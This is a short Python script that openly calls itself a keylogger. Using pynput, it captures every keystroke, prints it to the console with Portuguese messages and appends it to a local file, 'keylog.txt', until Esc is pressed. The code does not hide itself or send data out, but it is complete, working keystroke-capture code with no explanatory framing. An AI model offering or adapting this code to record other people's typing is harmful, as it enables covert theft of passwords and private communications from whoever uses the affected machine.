from pynput import keyboard
import time

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(str(key) + " ")

def on_press(key):
    try:
        print(f"Tecla pressionada: {key.char}")
        write_to_file(key.char)
    except AttributeError:
        print(f"Tecla especial pressionada: {key}")
        write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger encerrado.")
        return False
    
print("Iniciando o keylogger... Pressione 'Esc' para parar.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()